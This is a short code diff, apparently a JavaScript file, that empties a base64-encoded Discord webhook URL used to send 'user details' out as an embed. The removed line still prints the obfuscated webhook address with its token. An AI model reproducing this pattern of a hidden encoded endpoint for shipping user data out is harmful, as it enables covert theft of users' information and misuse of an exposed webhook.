@@ -1,5 +1,5 @@
 // Encoded webhook URL
-const encodedWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzOTg4NjIzMjMxODkwMjMxNC9HdWZnejd1cTVlU08xQ1NGMEE4X2RNS0ZDNGYtVm05dU5NTGFqdTFScXVneDlWZ05KREtVOFZ4RV9EMVUyRjJTeV90Tg==';
+const encodedWebhookURL = '';
 const webhookURL = atob(encodedWebhookURL); // Decoding the URL
 
 // Function to send user details to a Discord webhook as an embed
